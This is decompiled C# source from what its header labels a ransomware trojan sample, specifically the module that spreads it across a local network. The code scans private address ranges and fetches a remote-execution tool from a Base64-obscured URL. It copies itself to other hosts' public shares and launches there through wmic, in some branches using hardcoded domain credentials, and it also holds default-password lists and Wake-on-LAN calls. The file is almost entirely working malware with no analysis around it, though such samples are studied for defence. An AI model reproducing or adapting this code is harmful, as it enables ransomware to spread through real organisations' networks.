// Decompiled with JetBrains decompiler
// Type: Complex.NetworkSpreading
// Assembly: Client-2, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 10231E92-BCE6-4007-A463-67D77912E754
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.Win32.Generic-ec405cc32f21680a9328c4360bd6dc5b660af66209669ca815bebceefb6c3b39.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text.RegularExpressions;
using System.Threading;

namespace Complex
{
  internal class NetworkSpreading
  {
    public static List<string> lanList = new List<string>();
    public static string MyIP = "";
    public static List<string> names = new List<string>()
    {
      "Administrator",
      "Admin",
      "Guest",
      "User",
      "User1",
      "user-1",
      "Test",
      "root",
      "buh",
      "boss",
      "ftp",
      "rdp",
      "rdpuser",
      "rdpadmin",
      "manager",
      "support",
      "work",
      "other user",
      "operator",
      "backup",
      "asus",
      "ftpuser",
      "ftpadmin",
      "nas",
      "nasuser",
      "nasadmin",
      "superuser",
      "netguest",
      "alex"
    };
    public static List<string> passes = new List<string>()
    {
      "Administrator",
      "administrator",
      "Guest",
      "guest",
      "User",
      "user",
      "Admin",
      "adminTest",
      "test",
      "root",
      "root",
      "123",
      "1234",
      "12345",
      "123456",
      "1234567",
      "12345678",
      "123456789",
      "1234567890",
      "Administrator123",
      "administrator123",
      "Guest123",
      "guest123",
      "User123",
      "user123",
      "Admin123",
      "admin123Test123",
      "test123",
      "password",
      "111111",
      "55555",
      "77777",
      "777",
      "qwe",
      "qwe123",
      "qwe321",
      "qwer",
      "qwert",
      "qwerty",
      "qwerty123",
      "zxc",
      "zxc123",
      "zxcv",
      "uiop",
      "123321",
      "321",
      "love",
      "secret"
    };

    public static void Run()
    {
      try
      {
        NetworkSpreading.lanList = NetworkSpreading.GetLocalNetwork();
      }
      catch
      {
        return;
      }
      string str1 = "";
      if (NetworkSpreading.lanList.Count > 0)
      {
        try
        {
          str1 = NetworkSpreading.DownloadTool();
        }
        catch
        {
          return;
        }
      }
      try
      {
        if (System.IO.File.Exists(str1))
        {
          foreach (string lan in NetworkSpreading.lanList)
          {
            if (lan.StartsWith("10.") || lan.StartsWith("172.16.") || lan.StartsWith("192.168."))
            {
              try
              {
                if (Program.CredActivate == "YES")
                {
                  Program.ProcessCommand("net.exe", "use \\\\" + lan + " /USER:EDENFIELD\\efadmin P455w0rd");
                  Thread.Sleep(2000);
                  System.IO.File.Copy(Assembly.GetEntryAssembly().Location, "\\\\" + lan + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly().Location), true);
                  if (System.IO.File.Exists("\\\\" + lan + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly().Location)))
                    Program.ProcessCommand("wmic.exe", "/node:" + lan + " /user:EDENFIELD\\efadmin /password:P455w0rd process call create cmd.exe /c \\" + lan + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly().Location));
                }
                else
                {
                  Program.ProcessCommand("net.exe", "use \\\\" + lan);
                  Thread.Sleep(2000);
                  System.IO.File.Copy(Assembly.GetEntryAssembly().Location, "\\\\" + lan + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly().Location), true);
                  if (System.IO.File.Exists("\\\\" + lan + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly().Location)))
                    Program.ProcessCommand("wmic.exe", "/node:" + lan + " process call create cmd.exe /c \\\\" + lan + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly().Location));
                }
              }
              catch
              {
              }
              if (Program.CredActivate == "YES")
                Program.ProcessCommand(str1, "\\" + lan + " -u EDENFIELD\\efadmin -p P455w0rd -d -f -h -s -n 2 -c " + Assembly.GetEntryAssembly().Location);
              else
                Program.ProcessCommand(str1, "\\" + lan + " -d -f -h -s -n 2 -c " + Assembly.GetEntryAssembly().Location);
            }
          }
        }
      }
      catch
      {
        return;
      }
      List<IPInfo> ipInfo1 = IPInfo.GetIPInfo();
      foreach (IPInfo ipInfo2 in ipInfo1)
      {
        try
        {
          if (ipInfo2.IPAddress.StartsWith("10.") || ipInfo2.IPAddress.StartsWith("172.16.") || ipInfo2.IPAddress.StartsWith("192.168."))
            WakeOnLan.WakeUp(ipInfo2.MacAddress, ipInfo2.IPAddress, "255.255.255.0");
        }
        catch
        {
          return;
        }
      }
      foreach (IPInfo ipInfo3 in ipInfo1)
      {
        try
        {
          Regex regex = new Regex(".");
          List<string> stringList = NetScan.scan(regex.Split(ipInfo3.IPAddress)[0] + "." + regex.Split(ipInfo3.IPAddress)[1] + "." + regex.Split(ipInfo3.IPAddress)[2]);
          foreach (string str2 in stringList)
          {
            NetworkSpreading.MyIP = str2;
            foreach (string str3 in stringList)
            {
              if (str3.StartsWith("10.") || str3.StartsWith("172.16.") || str3.StartsWith("192.168."))
              {
                try
                {
                  if (Program.CredActivate == "YES")
                  {
                    Program.ProcessCommand("net.exe", "use \\\\" + str3 + " /USER:EDENFIELD\\efadmin P455w0rd");
                    Thread.Sleep(2000);
                    System.IO.File.Copy(Assembly.GetEntryAssembly().Location, "\\\\" + str3 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly().Location), true);
                    if (System.IO.File.Exists("\\\\" + str3 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly().Location)))
                      Program.ProcessCommand("wmic.exe", "/node:" + str3 + " /user:EDENFIELD\\efadmin /password:P455w0rd process call create cmd.exe /c \\\\" + str3 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly().Location));
                  }
                  else
                  {
                    Program.ProcessCommand("net.exe", "use \\\\" + str2);
                    Thread.Sleep(2000);
                    System.IO.File.Copy(Assembly.GetEntryAssembly().Location, "\\\\" + str3 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly().Location), true);
                    if (System.IO.File.Exists("\\\\" + str3 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly().Location)))
                      Program.ProcessCommand("wmic.exe", "/node:" + str3 + " process call create cmd.exe /c \\\\" + str3 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly().Location));
                  }
                }
                catch
                {
                }
                if (Program.CredActivate == "YES")
                  Program.ProcessCommand(str1, "\\" + str3 + " -u EDENFIELD\\efadmin -p P455w0rd -d -f -h -s -n 2 -c " + Assembly.GetEntryAssembly().Location);
                else
                  Program.ProcessCommand(str1, "\\" + str3 + " -d -f -h -s -n 2 -c " + Assembly.GetEntryAssembly().Location);
              }
            }
          }
        }
        catch
        {
          return;
        }
      }
      if (!System.IO.File.Exists(str1))
        return;
      System.IO.File.Delete(str1);
    }

    public static List<string> GetLocalNetwork()
    {
      List<string> localNetwork = new List<string>();
      foreach (IPAddress address in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
      {
        if (address.AddressFamily.ToString() == "InterNetwork")
          localNetwork.Add(address.ToString());
      }
      return localNetwork;
    }

    public static string DownloadTool() => IntPtr.Size != 8 ? NetworkSpreading.DownloadFile(new Uri(Program.Base64Decode("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU="))) : NetworkSpreading.DownloadFile(new Uri(Program.Base64Decode("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));

    public static string DownloadFile(Uri Url)
    {
      string path2 = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
      new WebClient().DownloadFile(Url, Path.Combine(Path.GetTempPath(), path2));
      return Path.Combine(Path.GetTempPath(), path2);
    }
  }
}
